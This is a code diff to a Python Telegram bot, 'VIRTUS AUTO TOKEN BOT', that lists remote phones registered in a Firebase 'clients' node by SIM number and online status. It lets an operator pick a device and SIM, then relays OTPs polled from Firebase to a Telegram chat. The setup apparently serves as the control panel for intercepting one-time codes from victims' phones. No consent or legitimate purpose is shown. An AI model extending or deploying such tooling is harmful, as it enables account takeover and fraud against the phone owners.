@@ -5,7 +5,7 @@ import os
 import re
 import time
 from concurrent.futures import ThreadPoolExecutor
-from dataclasses import asdict, dataclass
+from dataclasses import asdict, dataclass, field
 from pathlib import Path
 from typing import Any
 
@@ -87,6 +87,19 @@ SIM_KEYBOARD = ReplyKeyboardMarkup(
 last_sent: dict[int, set[str]] = {}
 last_otp_seen: dict[int, float] = {}
 processed_msg_ids: set[str] = set()
+device_list_watch: dict[int, tuple[int, int, str]] = {}  # user_id -> (chat_id, msg_id, firebase_url)
+
+
+@dataclass
+class DeviceInfo:
+    device_id: str
+    online: bool
+    sims: list[tuple[int, str, str]]  # (index 0/1, full_number, label "58")
+    sim_labels: list[str] = field(default_factory=list)
+
+    def __post_init__(self) -> None:
+        if not self.sim_labels:
+            self.sim_labels = [s[2] for s in self.sims]
 
 
 @dataclass
@@ -96,6 +109,7 @@ class UserConfig:
     chat_name: str = ""
     device_id: str = ""
     sim: str = "1"
+    sim_label: str = ""
     listening: bool = False
     listener_active: bool = False
     listen_started_at: float = 0.0
@@ -178,25 +192,162 @@ def fetch_base_url(firebase_url: str, device_id: str = "", user_base_url: str = 
     return result
 
 
-def fetch_online_devices(firebase_url: str) -> list[str]:
+def phone_label(number: str) -> str:
+    digits = re.sub(r"\D", "", str(number))
+    if len(digits) >= 2:
+        return digits[-2:]
+    return digits or "??"
+
+
+def is_device_online(info: dict) -> bool:
+    if not isinstance(info, dict):
+        return False
+    if "online" in info:
+        return bool(info["online"])
+    if "connected" in info:
+        return bool(info["connected"])
+    if str(info.get("status", "")).lower() in ("online", "connected", "active"):
+        return True
+    last_seen = info.get("lastSeen") or info.get("last_seen") or info.get("heartbeat")
+    if last_seen is not None:
+        ts = float(last_seen)
+        if ts > 1e12:
+            ts /= 1000
+        return time.time() - ts < 90
+    return False
+
+
+def extract_sim_numbers(info: dict) -> list[tuple[int, str, str]]:
+    """SIM list: (index 0/1, full number, label like 58)."""
+    results: list[tuple[int, str, str]] = []
+    seen: set[str] = set()
+
+    def add(num: Any, idx: int) -> None:
+        if num is None or num == "":
+            return
+        digits = re.sub(r"\D", "", str(num))
+        if len(digits) < 2 or digits in seen:
+            return
+        seen.add(digits)
+        results.append((idx, digits, phone_label(digits)))
+
+    pairs = [
+        ("sim1", 0), ("sim1Number", 0), ("sim_1", 0), ("number1", 0),
+        ("sim2", 1), ("sim2Number", 1), ("sim_2", 1), ("number2", 1),
+    ]
+    for key, idx in pairs:
+        if key in info:
+            add(info[key], idx)
+
+    for key in ("phone", "phoneNumber", "mobile", "number", "msisdn"):
+        if key in info and not results:
+            add(info[key], 0)
+
+    sims = info.get("sims") or info.get("numbers") or info.get("phoneNumbers")
+    if isinstance(sims, list):
+        for i, item in enumerate(sims):
+            if isinstance(item, dict):
+                add(item.get("number") or item.get("phone") or item.get("mobile"), i)
+            else:
+                add(item, i)
+    elif isinstance(sims, dict):
+        for key, item in sims.items():
+            idx = 0
+            if isinstance(key, str) and any(c.isdigit() for c in key):
+                m = re.search(r"\d+", key)
+                idx = max(0, int(m.group()) - 1) if m else len(results)
+            if isinstance(item, dict):
+                add(item.get("number") or item.get("phone"), idx)
+            else:
+                add(item, idx)
+
+    results.sort(key=lambda x: x[0])
+    return results
+
+
+def parse_device_info(device_id: str, info: Any) -> DeviceInfo:
+    if not isinstance(info, dict):
+        return DeviceInfo(device_id=device_id, online=True, sims=[])
+    sims = extract_sim_numbers(info)
+    return DeviceInfo(
+        device_id=device_id,
+        online=is_device_online(info),
+        sims=sims,
+    )
+
+
+def fetch_all_devices(firebase_url: str) -> list[DeviceInfo]:
     try:
         clients = firebase_get(firebase_url, "clients") or {}
         if not isinstance(clients, dict):
             return []
-
-        online: list[str] = []
-        for device_id, info in clients.items():
-            if info is None:
-                online.append(device_id)
-            elif isinstance(info, dict):
-                if info.get("online", True):
-                    online.append(device_id)
-            else:
-                online.append(device_id)
-        return online
+        devices = [parse_device_info(did, info) for did, info in clients.items()]
+        devices.sort(key=lambda d: (not d.online, d.device_id))
+        return devices
     except Exception as exc:
         log.warning("devices fetch failed: %s", exc)
         return []
+
+
+def get_device_by_id(firebase_url: str, device_id: str) -> DeviceInfo | None:
+    try:
+        info = firebase_get(firebase_url, f"clients/{device_id}")
+        return parse_device_info(device_id, info or {})
+    except Exception:
+        return None
+
+
+def fetch_online_devices(firebase_url: str) -> list[str]:
+    return [d.device_id for d in fetch_all_devices(firebase_url) if d.online]
+
+
+def build_device_list_text(devices: list[DeviceInfo]) -> str:
+    if not devices:
+        return "❌ Koi device nahi mila Firebase mein."
+
+    lines = ["📱 *Devices* _(real-time)_\n"]
+    online_n = sum(1 for d in devices if d.online)
+    lines.append(f"🟢 Online: {online_n} | 🔴 Offline: {len(devices) - online_n}\n")
+
+    for dev in devices:
+        icon = "🟢" if dev.online else "🔴"
+        status = "Online" if dev.online else "Offline"
+        if dev.sim_labels:
+            nums = " · ".join(dev.sim_labels)
+            lines.append(f"{icon} *{nums}* — {status}")
+        else:
+            lines.append(f"{icon} `{dev.device_id[:12]}...` — {status}")
+
+    lines.append("\n_Tap number to select online device_")
+    return "\n".join(lines)
+
+
+def build_device_keyboard(devices: list[DeviceInfo]) -> InlineKeyboardMarkup:
+    buttons = []
+    for dev in devices[:20]:
+        if dev.sim_labels:
+            label = f"{'🟢' if dev.online else '🔴'} {' '.join(dev.sim_labels)}"
+        else:
+            label = f"{'🟢' if dev.online else '🔴'} {dev.device_id[:10]}"
+        buttons.append([InlineKeyboardButton(label, callback_data=f"dev:{dev.device_id}")])
+    buttons.append([InlineKeyboardButton("🔄 Refresh", callback_data="refresh_devices")])
+    return InlineKeyboardMarkup(buttons)
+
+
+def build_sim_keyboard(device: DeviceInfo) -> InlineKeyboardMarkup:
+    if device.sims:
+        rows = []
+        for idx, _full, label in device.sims:
+            sim_num = str(idx + 1)
+            rows.append([InlineKeyboardButton(f"📞 {label}", callback_data=f"sim:{sim_num}:{label}")])
+        return InlineKeyboardMarkup(rows)
+
+    return InlineKeyboardMarkup(
+        [
+            [InlineKeyboardButton("📞 Slot 1", callback_data="sim:1:1")],
+            [InlineKeyboardButton("📞 Slot 2", callback_data="sim:2:2")],
+        ]
+    )
 
 
 def parse_sms(text: str) -> tuple[str, str] | None:
@@ -262,11 +413,28 @@ def status_text(cfg: UserConfig) -> str:
     listening = "ON" if cfg.listening else "OFF"
     active = "YES" if cfg.listener_active else "NO"
     api = cfg.base_url or fetch_base_url(cfg.firebase_url, cfg.device_id) or "—"
+
+    device_line = cfg.device_id or "—"
+    sim_line = cfg.sim_label or cfg.sim or "—"
+    online_line = "—"
+
+    if cfg.firebase_url and cfg.device_id:
+        dev = get_device_by_id(cfg.firebase_url, cfg.device_id)
+        if dev:
+            online_line = "🟢 Online" if dev.online else "🔴 Offline"
+            if dev.sim_labels:
+                sim_line = " · ".join(
+                    f"{'🟢' if dev.online else '🔴'}{lbl}" for lbl in dev.sim_labels
+                )
+            if cfg.sim_label:
+                device_line = f"{cfg.sim_label} ({cfg.device_id[:8]}...)"
+
     return (
         f"Firebase URL: {cfg.firebase_url or '—'}\n"
         f"API URL: {api}\n"
-        f"Device ID: {cfg.device_id or '—'}\n"
-        f"SIM: {cfg.sim or '—'}\n"
+        f"Device: {device_line}\n"
+        f"Status: {online_line}\n"
+        f"Number: {sim_line}\n"
         f"Chat Name: {cfg.chat_name or '—'}\n"
         f"Chat ID: {cfg.chat_id or '—'}\n"
         f"Step: {cfg.step}\n"
@@ -290,7 +458,7 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         "1️⃣ 👥 Change → group/channel set karo\n"
         "2️⃣ 🔥 Change Firebase → Firebase URL daalo\n"
         "3️⃣ 📱 Change Device → online device select karo\n"
-        "4️⃣ 🔢 Select SIM → SIM 1 ya 2\n"
+        "4️⃣ 🔢 Select SIM → number choose karo (58, 70...)\n"
         "5️⃣ ▶️ Start Listen → listening shuru\n\n"
         "Pehle *👥 Change* dabao aur apna group/channel set karo.",
         parse_mode="Markdown",
@@ -401,28 +569,29 @@ async def save_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE, url:
 
 
 async def show_devices(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    cfg = get_config(update.effective_user.id, context)
+    user_id = update.effective_user.id
+    cfg = get_config(user_id, context)
     if not cfg.firebase_url:
         await update.message.reply_text("❌ Pehle Firebase URL set karo.\n/setfirebase", reply_markup=MAIN_KEYBOARD)
         return
 
-    devices = fetch_online_devices(cfg.firebase_url)
+    loop = asyncio.get_running_loop()
+    devices = await loop.run_in_executor(EXECUTOR, fetch_all_devices, cfg.firebase_url)
+
     if not devices:
         await update.message.reply_text(
-            "❌ Koi online device nahi mila.\n\n"
-            "Firebase mein `clients` node check karo.\n"
-            "Example:\n"
-            "`/clients/device-id/online: true`",
+            "❌ Koi device nahi mila.\n\n"
+            "Firebase mein `clients` node check karo:\n"
+            "```\n/clients/{device-id}/online: true\n/clients/{device-id}/sim1: \"9876545858\"\n```",
+            parse_mode="Markdown",
             reply_markup=MAIN_KEYBOARD,
         )
         return
 
-    buttons = [[InlineKeyboardButton(d[:20] + ("..." if len(d) > 20 else ""), callback_data=f"dev:{d}")] for d in devices[:20]]
-    await update.message.reply_text(
-        "📱 *Online Devices*\nTap karke select karo:",
-        parse_mode="Markdown",
-        reply_markup=InlineKeyboardMarkup(buttons),
-    )
+    text = build_device_list_text(devices)
+    keyboard = build_device_keyboard(devices)
+    msg = await update.message.reply_text(text, parse_mode="Markdown", reply_markup=keyboard)
+    device_list_watch[user_id] = (msg.chat_id, msg.message_id, cfg.firebase_url)
 
 
 async def show_sim_select(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -431,13 +600,23 @@ async def show_sim_select(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         await update.message.reply_text("❌ Pehle device select karo.", reply_markup=MAIN_KEYBOARD)
         return
 
-    keyboard = InlineKeyboardMarkup(
-        [
-            [InlineKeyboardButton("SIM 1", callback_data="sim:1")],
-            [InlineKeyboardButton("SIM 2", callback_data="sim:2")],
-        ]
+    loop = asyncio.get_running_loop()
+    device = await loop.run_in_executor(
+        EXECUTOR, get_device_by_id, cfg.firebase_url, cfg.device_id
     )
-    await update.message.reply_text("🔢 *Select SIM slot:*", parse_mode="Markdown", reply_markup=keyboard)
+    if not device:
+        device = DeviceInfo(device_id=cfg.device_id, online=False, sims=[])
+
+    status = "🟢 Online" if device.online else "🔴 Offline"
+    label_hint = " · ".join(device.sim_labels) if device.sim_labels else cfg.device_id[:10]
+
+    await update.message.reply_text(
+        f"🔢 *Select Number* ({status})\n"
+        f"Device: *{label_hint}*\n"
+        f"Apna number choose karo:",
+        parse_mode="Markdown",
+        reply_markup=build_sim_keyboard(device),
+    )
 
 
 async def start_listen(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -480,45 +659,82 @@ async def start_listen(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
 
 async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     query = update.callback_query
-    await query.answer()
     user_id = query.from_user.id
     cfg = get_config(user_id, context)
     data = query.data or ""
 
     if data.startswith("dev:"):
         device_id = data[4:]
+        loop = asyncio.get_running_loop()
+        device = await loop.run_in_executor(
+            EXECUTOR, get_device_by_id, cfg.firebase_url, device_id
+        )
+
+        if device and not device.online:
+            await query.answer("⚠️ Ye device offline hai!", show_alert=True)
+        else:
+            await query.answer()
+
         cfg.device_id = device_id
         cfg.step = "sim"
         persist_config(user_id, cfg)
-        await query.edit_message_text(f"✅ Device selected: `{device_id}`", parse_mode="Markdown")
+        device_list_watch.pop(user_id, None)
+
+        label = " · ".join(device.sim_labels) if device and device.sim_labels else device_id[:10]
+        status = "🟢 Online" if device and device.online else "🔴 Offline"
+
+        await query.edit_message_text(
+            f"✅ Device selected: *{label}* ({status})",
+            parse_mode="Markdown",
+        )
         await context.bot.send_message(
             chat_id=query.message.chat_id,
             text=(
-                f"✅ Device: `{device_id}`\n"
+                f"✅ Device: *{label}* — {status}\n"
                 f"📌 Saved chat: *{cfg.chat_name or '—'}*\n\n"
-                "Step 4: SIM slot select karo.\nTap *🔢 Select SIM*"
+                "Step 4: Number select karo.\nTap *🔢 Select SIM*"
             ),
             parse_mode="Markdown",
             reply_markup=SIM_KEYBOARD,
         )
         return
 
+    if data == "refresh_devices":
+        firebase_url = cfg.firebase_url
+        if not firebase_url:
+            await query.answer("Firebase URL missing")
+            return
+        await query.answer("🔄 Refreshed")
+        loop = asyncio.get_running_loop()
+        devices = await loop.run_in_executor(EXECUTOR, fetch_all_devices, firebase_url)
+        text = build_device_list_text(devices)
+        keyboard = build_device_keyboard(devices)
+        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=keyboard)
+        device_list_watch[user_id] = (query.message.chat_id, query.message.message_id, firebase_url)
+        return
+
     if data.startswith("sim:"):
-        sim = data[4:]
+        await query.answer()
+        parts = data.split(":")
+        sim = parts[1] if len(parts) > 1 else "1"
+        sim_label = parts[2] if len(parts) > 2 else sim
         cfg.sim = sim
+        cfg.sim_label = sim_label
         cfg.step = "ready"
         persist_config(user_id, cfg)
-        await query.edit_message_text(f"✅ SIM {sim} selected.")
+        await query.edit_message_text(f"✅ Number *{sim_label}* selected.", parse_mode="Markdown")
         await context.bot.send_message(
             chat_id=query.message.chat_id,
             text=(
                 "✅ *All set!*\n"
+                f"📌 Number: *{sim_label}*\n"
                 f"📌 Saved chat: *{cfg.chat_name or '—'}*\n\n"
                 "Step 5: Start listening.\nTap *▶️ Start Listen*"
             ),
             parse_mode="Markdown",
             reply_markup=MAIN_KEYBOARD,
         )
+        return
 
 
 async def handle_private_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -840,6 +1056,29 @@ async def poll_firebase_otp(context: ContextTypes.DEFAULT_TYPE) -> None:
             break
 
 
+async def poll_device_list(context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Device list real-time refresh — har 0.1 sec."""
+    if not device_list_watch:
+        return
+
+    loop = asyncio.get_running_loop()
+
+    for user_id, (chat_id, msg_id, firebase_url) in list(device_list_watch.items()):
+        try:
+            devices = await loop.run_in_executor(EXECUTOR, fetch_all_devices, firebase_url)
+            text = build_device_list_text(devices)
+            keyboard = build_device_keyboard(devices)
+            await context.bot.edit_message_text(
+                chat_id=chat_id,
+                message_id=msg_id,
+                text=text,
+                parse_mode="Markdown",
+                reply_markup=keyboard,
+            )
+        except Exception:
+            pass
+
+
 def main() -> None:
     print("\n🚀 VIRTUS AUTO TOKEN BOT STARTING\n")
     print(f"⚡ Poll interval: {POLL_INTERVAL}s | SMS timeout: {SMS_TIMEOUT}s\n")
@@ -878,6 +1117,8 @@ def main() -> None:
 
     # Firebase OTP poll — har 0.1 sec
     app.job_queue.run_repeating(poll_firebase_otp, interval=POLL_INTERVAL, first=0.5)
+    # Device list real-time refresh
+    app.job_queue.run_repeating(poll_device_list, interval=POLL_INTERVAL, first=1.0)
 
     app.run_polling(drop_pending_updates=True)
 
